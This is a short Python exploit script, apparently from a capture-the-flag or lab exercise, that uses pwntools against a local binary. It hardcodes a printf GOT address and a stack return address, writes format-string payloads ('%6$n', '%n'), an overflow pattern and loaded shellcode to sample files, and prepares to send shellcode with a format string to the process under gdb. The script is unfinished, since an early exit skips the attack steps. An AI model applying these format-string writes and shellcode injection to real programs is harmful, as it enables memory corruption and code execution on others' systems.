#!/usr/bin/python3

import pwnlib,struct,sys

printf_got_addr = 0x601028

got_addr = pwnlib.util.packing.p64(printf_got_addr)

main_ret_addr = 0x7fffffffdb78

main_ret = pwnlib.util.packing.p64(main_ret_addr)

#open('dump','wb+').write(got_addr+b'%6$n')

sc = open('shellcode.bin','rb').read()

proc = pwnlib.tubes.process.process('./nothing')

open('sample0.bin','wb').write(bytes.fromhex('281060')+b'AAAA%6$n')
open('sample1.bin','wb').write(b'AAAAAA%n')
open('sample2.bin','wb').write(b'A'*300)
open('sample3.bin','wb').write(sc)
sys.exit(0)

proc.recv()

#proc.sendline(bytes.fromhex('601028')+b'%6$x')

proc.sendline(sc+b'%6$x')

#proc.sendline('AAAA')

pwnlib.gdb.attach(proc)


print(proc.recv())
